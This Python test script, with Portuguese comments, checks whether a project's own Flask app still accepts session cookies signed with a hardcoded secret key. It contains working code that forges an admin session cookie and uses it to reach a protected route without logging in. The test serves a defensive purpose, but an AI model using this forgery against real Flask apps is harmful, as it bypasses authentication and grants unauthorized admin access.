import sys
import os
from flask.sessions import SecureCookieSessionInterface

# Adiciona o diretório do projeto ao PATH
sys.path.insert(0, r'c:\Users\jacom\OneDrive\Desktop\Projetos\Peças_Barel')

try:
    from app import app
    print("Sucesso ao importar o app Flask!")
except Exception as e:
    print(f"Erro ao importar o app: {e}")
    sys.exit(1)

def test_session_forgery_exploit():
    print("\n--- TESTANDO SE É POSSÍVEL BURLAR O LOGIN VIA FALSIFICAÇÃO DE COOKIE ---")
    
    # 1. Configurar o Flask Test Client
    client = app.test_client()
    
    # 2. Criar o serializer usando a chave secreta antiga (estática e previsível)
    # Isso simula um atacante externo gerando o cookie usando a chave que ele descobriu no código.
    from itsdangerous import URLSafeTimedSerializer
    from flask.json.tag import TaggedJSONSerializer
    
    serializer = URLSafeTimedSerializer(
        'barel-secret-key-2026',
        salt='cookie-session',
        serializer=TaggedJSONSerializer(),
        signer_kwargs={'key_derivation': 'hmac', 'digest_method': 'sha1'}
    )
        
    # 3. Forjar dados de sessão (por exemplo, simulando o admin com id 1)
    forged_session_data = {
        'user_id': 1,
        'username': 'admin'
    }
    
    # 4. Assinar o cookie com a chave estática antiga
    forged_cookie_value = serializer.dumps(forged_session_data)
    print(f"[+] Cookie de sessão forjado gerado: {forged_cookie_value}")
    
    # 5. Fazer uma requisição para uma rota protegida (/products) enviando o cookie forjado
    # O Flask usa 'session' como o nome padrão do cookie
    client.set_cookie('session', forged_cookie_value)
    
    print("[+] Enviando requisição para rota protegida '/products' com o cookie forjado...")
    response = client.get('/products')
    
    print(f"[*] Código de Status do Servidor: {response.status_code}")
    
    # 6. Analisar se o acesso foi concedido sem passar pela tela de login
    if response.status_code == 200:
        print("\n[ALERTA DE SEGURANÇA] FALHA GRAVE ENCONTRADA!")
        print("-> Foi possível burlar a tela de login forjando um cookie de sessão usando a chave secreta padrão!")
        print("-> A rota protegida '/products' foi acessada com sucesso e retornou Status 200.")
        return True
    elif response.status_code == 302:
        print("\n[OK] O servidor rejeitou o cookie de sessão ou redirecionou de volta para o login.")
        return False
    else:
        print(f"\n[INFO] O servidor retornou o status {response.status_code}. Investigação necessária.")
        return False

if __name__ == '__main__':
    exploit_succeeded = test_session_forgery_exploit()
    if exploit_succeeded:
        sys.exit(1) # Indica falha de segurança existente
    else:
        sys.exit(0) # Indica que a segurança resistiu
